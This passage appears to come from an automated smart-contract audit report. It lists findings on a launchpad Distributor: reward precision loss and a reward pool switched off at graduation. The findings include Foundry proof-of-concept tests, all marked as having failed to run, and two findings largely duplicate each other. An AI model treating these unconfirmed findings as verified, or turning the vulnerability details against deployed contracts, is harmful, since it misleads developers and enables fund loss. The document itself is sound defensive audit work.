### Finding Severity Justification: The precision factor of 1e12 in `RewardsTrackerLib` is critically insufficient for standard 18-decimal launchpad tokens. For a token with a 1 billion supply (1e27 wei), any reward amount less than ~800 million USDC (8e14 wei) will result in zero increment to the reward accumulator. This causes the rewards to be effectively burned from the pending state while remaining locked in the contract balance. Since `totalPendingRewards` is not decremented (as no rewards are claimed), the `skimExcessRewards` function cannot recover these funds, leading to a permanent freeze of yield assets.
## Derived From Pattern/Invariant
PricePrecision

## Exploit Type
PricePrecision

## Location
RewardsTrackerLib.update

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `RewardsTrackerLib.getAccRewardsPerShare`, the accumulator calculation uses a `PRECISION_FACTOR` of `1e12`. The formula is `acc += (pending * 1e12) / totalShares`. 

Launchpad tokens typically have 18 decimals. If a pool has 80% of a 1 billion supply (8e26 wei) and receives a fee reward of 1 USDC (1e6 wei), the numerator is `1e6 * 1e12 = 1e18`. The denominator is `8e26`. The division yields 0. 

However, `update` deletes the `pendingBaseRewards` / `pendingQuoteRewards` after this calculation. The rewards are effectively destroyed from the staker's perspective. Meanwhile, `Distributor.totalPendingRewards` tracks these amounts globally. Since `skimExcessRewards` only allows withdrawing amounts *in excess* of `totalPendingRewards`, these dust amounts are permanently locked in the contract.

## Impact
Permanent loss of yield for stakers. For standard token supplies and typical fee amounts (swaps), almost 100% of rewards will be lost due to rounding down to zero.

## Command to Run Test


## Proof of Concept
1. `totalShares` = 1,000,000 tokens (1e24 wei).
2. A swap generates 0.5 USDC fee (500,000 wei).
3. `addRewards` adds 500,000 to pending.
4. `update` calculates `(500,000 * 1e12) / 1e24` = `5e17 / 1e24` = 0.
5. Accumulator does not increase.
6. `pendingQuoteRewards` is deleted.
7. User claims 0 rewards.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {MockERC20} from "forge-std/mocks/MockERC20.sol";

contract PrecisionLossTest is Test {
    Distributor distributor;
    MockERC20 launchToken;
    MockERC20 usdc;
    
    address launchpad = makeAddr("launchpad");
    address user = makeAddr("user");

    function setUp() public {
        // Deploy contracts
        distributor = new Distributor();
        distributor.initialize(launchpad);
        
        launchToken = new MockERC20();
        launchToken.initialize("Launch", "LCH", 18);
        
        usdc = new MockERC20();
        usdc.initialize("USDC", "USDC", 6);
    }

    function testPrecisionLoss() public {
        // 1. Setup: Create pair and stake shares
        vm.startPrank(launchpad);
        distributor.createRewardsPair(address(launchToken), address(usdc));
        
        // Stake 1 million tokens (1e24 wei) - realistic pool size
        uint96 shares = 1e24; 
        distributor.increaseStake(address(launchToken), user, shares);
        vm.stopPrank();
        
        // 2. Add Rewards: 100 USDC (100e6 wei)
        // Formula: (pending * 1e12) / shares
        // Calc: (100e6 * 1e12) / 1e24 = 1e20 / 1e24 = 0
        uint128 reward = 100e6; 
        deal(address(usdc), address(this), reward);
        usdc.approve(address(distributor), reward);
        
        distributor.addRewards(address(launchToken), address(usdc), 0, reward);

        // 3. Verify Precision Loss
        // Although rewards were added, accRewardsPerShare did not increase due to precision loss.
        // The pending rewards in the tracker are reset to 0 during update().
        (uint256 pBase, uint256 pQuote) = distributor.getPendingRewards(address(launchToken), user);
        
        console.log("Pending Quote Rewards:", pQuote);
        console.log("Expected (approx):", reward);
        
        assertEq(pQuote, 0, "Rewards should be lost due to precision factor");
        
        // 4. Verify funds are locked
        // Global tracker thinks they are pending, so balance - globalPending == 0
        uint256 globalPending = distributor.totalPendingRewards(address(usdc));
        assertEq(globalPending, reward, "Global tracker should still count the rewards");
        
        uint256 balance = usdc.balanceOf(address(distributor));
        // Skim logic: amount > balance - totalPending -> revert
        // Here balance == totalPending, so available to skim is 0.
        uint256 skimmable = balance > globalPending ? balance - globalPending : 0;
        assertEq(skimmable, 0, "Cannot skim the lost rewards");
    }
}

## Suggested Mitigation
Increase `PRECISION_FACTOR` to `1e36` (or `1e27`+) to support 18-decimal shares. Crucially, you must also cast the operands to `uint256` before multiplication to prevent execution reverts (as `uint128 * uint128` overflows with `1e36`). 

Example fix:
`accBaseRewardsPerShare += ((uint256(self.pendingBaseRewards) * PRECISION_FACTOR) / totalShares);`

Alternatively, use `Math.mulDiv` for safe, full-precision calculation.





 **Derived From** : MaturityorGatingByPass

## [H-21]. Reward pool deactivated prematurely at graduation, preventing fee accrual

### Finding Severity Justification: The vulnerability results in the permanent and complete loss of trading fee rewards for protocol participants. The GTELaunchpadV2Pair is explicitly designed to accrue specific fees (REWARDS_FEE_SHARE) for the Distributor to reward early backers. However, the protocol workflow (Graduation) calls 'endRewardsAccrual' immediately after creating the pair. This function sets 'rewardsPoolActive' to 0. Consequently, the 'swap' function in the pair, which checks 'rewardsPoolActive > 0', will always skip fee accrual. This makes the fee distribution mechanism dead code and causes a 100% loss of expected yield for stakers.
## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
StandardViolation

## Location
GTELaunchpadV2Pair.endRewardsAccrual

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Distributor.endRewards` function is called by the Launchpad at the moment of graduation (when the bonding curve completes and the LP is created). This function calls `pair.endRewardsAccrual()`, which sets `rewardsPoolActive = 0`. Consequently, the Pair stops collecting launchpad fees immediately upon creation. This violates the protocol design that LP fees should feed the Distributor, resulting in total loss of yield for stakers.

## Impact
Stakers receive zero rewards from AMM trading fees, defeating the purpose of the Distributor in the post-launch phase.

## Command to Run Test


## Proof of Concept
1. Token launches, bonding curve fills. 2. Launchpad deploys Pair and calls `Distributor.endRewards(pair)`. 3. `Distributor` calls `pair.endRewardsAccrual()`. 4. Pair sets `rewardsPoolActive` to 0. 5. Users trade on Pair. `_getLaunchpadFees` returns 0 because `rewardsPoolActive` is 0.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";

contract MockToken is ERC20 {
    function name() public pure override returns (string memory) { return "Mock"; }
    function symbol() public pure override returns (string memory) { return "MCK"; }
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract PrematureEndRewardsTest is Test {
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    MockToken token0;
    MockToken token1;
    
    address launchpad = address(0x999);

    function setUp() public {
        // Deploy dependencies
        token0 = new MockToken();
        token1 = new MockToken();
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);

        distributor = new Distributor();
        distributor.initialize(launchpad);

        pair = new GTELaunchpadV2Pair();
        // Initialize pair as if created by factory
        pair.initialize(address(token0), address(token1), launchpad, address(distributor));
    }

    function test_PrematureEndRewards_PreventsFeeAccrual() public {
        // 1. Provide initial liquidity to the pair
        token0.mint(address(pair), 1000e18);
        token1.mint(address(pair), 1000e18);
        pair.mint(address(this)); 

        // Verify baseline: Rewards pool starts active
        assertEq(pair.rewardsPoolActive(), 1, "Rewards pool should be active initially");

        // 2. Simulate Graduation: Launchpad calls endRewards on Distributor
        vm.prank(launchpad);
        distributor.endRewards(pair);

        // Verify state: Rewards pool is now inactive (0)
        assertEq(pair.rewardsPoolActive(), 0, "Rewards pool deactivated prematurely");

        // 3. Simulate trading activity
        address trader = address(0x123);
        token0.mint(trader, 10e18);
        
        vm.startPrank(trader);
        token0.transfer(address(pair), 10e18);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 amountInWithFee = 10e18 * 997;
        uint256 amountOut = (amountInWithFee * reserve1) / (reserve0 * 1000 + amountInWithFee);
        pair.swap(0, amountOut, trader, "");
        vm.stopPrank();

        // 4. Check accrued fees: Should be 0 because pool was deactivated
        (uint112 fee0, uint112 fee1,) = pair.getAccruedLaunchpadFees();
        
        assertEq(fee0, 0, "Fee0 accrued should be 0 due to inactive pool");
        assertEq(fee1, 0, "Fee1 accrued should be 0 due to inactive pool");
    }
}

## Suggested Mitigation
Remove the call to `pair.endRewardsAccrual()` inside `Distributor.endRewards`. Since `Distributor.endRewards` currently contains *only* this line, the function itself may be redundant or should be repurposed solely to trigger any necessary state changes in the Distributor without deactivating the pair's fee collection.





 **Derived From** : Issue Type: MaturityorGatingByPass

 ### Relevant Function/Location: Distributor.endRewards

 ### Title
Reward pool deactivated prematurely at graduation

## [H-22]. Launchpad Fees Permanently Disabled at Graduation

### Finding Severity Justification: The finding demonstrates a critical logic error in the protocol's lifecycle. By calling `endRewardsAccrual` at the 'Graduation' event (which coincides with the creation of the pair), the protocol permanently disables the fee collection mechanism for the Distributor. This results in a 100% loss of the intended protocol revenue/yield for Launchpad stakers, as fees are never separated from the liquidity pool reserves. While strictly 'unmatured yield', the total and permanent breakage of the core economic incentive model warrants a High severity.
## Derived From Pattern/Invariant
Issue Type: MaturityorGatingByPass

 ### Relevant Function/Location: Distributor.endRewards

 ### Title
Reward pool deactivated prematurely at graduation

## Exploit Type
StandardViolation

## Location
GTELaunchpadV2Pair.endRewardsAccrual

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Distributor.endRewards` function calls `pair.endRewardsAccrual()`, which sets `rewardsPoolActive = 0` in `GTELaunchpadV2Pair`. This function is called at 'Graduation' (when the bonding curve completes and the pair is created). This effectively disables fee collection for the Distributor immediately upon the pair's creation. Consequently, the `GTELaunchpadV2Pair` never accrues launchpad fees for the stakers, violating the protocol's core incentive specification that fees should feed the launchpad distributor.

## Impact
Complete loss of protocol revenue/yield for launchpad participants.

## Command to Run Test


## Proof of Concept
1. Deploy `GTELaunchpadV2Pair` and `Distributor`.
2. Initialize Pair with the Distributor set correctly.
3. Mint LP tokens to the Launchpad address to simulate the post-graduation state where the Launchpad holds the liquidity.
4. Call `Distributor.endRewards(pair)` simulating the 'Graduation' event triggered by the Launchpad contract.
5. Verify `pair.rewardsPoolActive()` is now 0.
6. Perform a swap on the pair.
7. Verify that `accruedLaunchpadFee` variables remain 0, confirming the revenue stream is disabled.

## Proof of Code
function testLaunchpadFeesPermanentlyDisabled() public {
    // Setup
    MockERC20 token0 = new MockERC20();
    MockERC20 token1 = new MockERC20();
    if (address(token0) > address(token1)) (token0, token1) = (token1, token0);

    Distributor distributor = new Distributor();
    address launchpad = address(0x999);
    distributor.initialize(launchpad);

    GTELaunchpadV2Pair pair = new GTELaunchpadV2Pair();
    pair.initialize(address(token0), address(token1), launchpad, address(distributor));

    // Simulate Launchpad providing liquidity
    token0.mint(address(pair), 1000 ether);
    token1.mint(address(pair), 1000 ether);
    pair.mint(launchpad);

    // --- EXPLOIT SCENARIO ---
    // The protocol calls endRewards at graduation
    vm.prank(launchpad);
    distributor.endRewards(IGTELaunchpadV2Pair(address(pair)));

    // Assert the pool is deactivated
    assertEq(pair.rewardsPoolActive(), 0, "Rewards pool should be inactive");

    // Perform a swap that should generate fees
    token0.mint(address(this), 10 ether);
    token0.transfer(address(pair), 10 ether);
    (uint112 r0, uint112 r1,) = pair.getReserves();
    uint256 amountOut = (10 ether * 997 * uint(r1)) / (uint(r0) * 1000 + 10 ether * 997);
    pair.swap(0, amountOut, address(this), "");

    // Check fees
    (uint112 fee0, uint112 fee1, ) = pair.getAccruedLaunchpadFees();
    assertEq(fee0, 0, "Fee0 should be 0 due to disabled rewards");
    assertEq(fee1, 0, "Fee1 should be 0 due to disabled rewards");
}

## Suggested Mitigation
Remove the call to `pair.endRewardsAccrual()` within `Distributor.endRewards`, or ensure `Distributor.endRewards` is NOT called during the Graduation/Token Unlock phase. The `endRewardsAccrual` function on the pair should only be called if the intention is to permanently deprecate the pool's fee collection mechanism, not during its initialization.



